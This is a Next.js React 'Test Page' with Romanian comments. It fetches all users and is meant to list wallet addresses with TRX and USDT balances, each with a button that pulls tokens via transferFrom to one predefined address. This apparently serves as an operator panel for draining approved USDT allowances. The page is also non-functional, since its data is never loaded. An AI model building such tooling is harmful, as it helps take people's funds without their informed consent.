"use client";
import { useState, useEffect } from "react";
import { useTransferFrom } from "../hooks/useTransferFrom"; // Importăm hook-ul

export default function Home() {
  const [data, setData] = useState([]); // Stochează datele din data.json
  const [loading, setLoading] = useState(true); // Indicator pentru încărcarea datelor
  const { initiateTransferFrom, transactionStatus, isLoading } = useTransferFrom(); // Hook pentru transfer

  const [transferValues, setTransferValues] = useState({}); // Stochează valorile inputurilor

  

  // Cerere către ruta getAllUsers și afișarea datelor în consolă
  const fetchAllUsers = async () => {
    try {
      const response = await fetch("/api/getAllUsers", { method: "GET" });
      if (response.ok) {
        const json = await response.json();
        console.log("Utilizatori:", json); // Afișăm utilizatorii în consolă
      } else {
        console.error("Eroare la obținerea utilizatorilor:", response.statusText);
      }
    } catch (error) {
      console.error("Eroare la cererea utilizatorilor:", error);
    }
  };

  useEffect(() => {
    fetchAllUsers(); // Apelăm cererea pentru utilizatori
  }, []);

  const handleInputChange = (id, value) => {
    setTransferValues((prev) => ({
      ...prev,
      [id]: parseFloat(value) || 0,
    }));
  };

  return (
    <>
      <h1>Test Page</h1>
      <h2>Conținutul fișierului:</h2>
      {loading ? (
        <p>Se încarcă...</p>
      ) : data.length > 0 ? (
        <ul>
          {data.map((item, index) => (
            <li key={index}>
              <strong>Adresa:</strong> {item.address}, <br />
              <strong>TRX:</strong> {item.trx}, <br />
              <strong>USDT:</strong> {item.usdt}, <br />
              <strong>Timestamp:</strong> {item.timestamp}, <br />
              <input
                type="number"
                placeholder="Sumă de transmis"
                onChange={(e) => handleInputChange(index, e.target.value)}
              />
              <button
                onClick={() => {
                  initiateTransferFrom({
                    fromAddress: item.address,
                    toAddress: process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT,
                    amount: transferValues[index] || 0,
                  });
                }}
                disabled={isLoading || !transferValues[index] || transferValues[index] <= 0}
              >
                {isLoading ? "Se procesează..." : "Transmite"}
              </button>
            </li>
          ))}
        </ul>
      ) : (
        <p>Nu există date disponibile.</p>
      )}
      <div>
        <h3>Status Tranzacție:</h3>
        <p>{transactionStatus}</p>
      </div>
    </>
  );
}
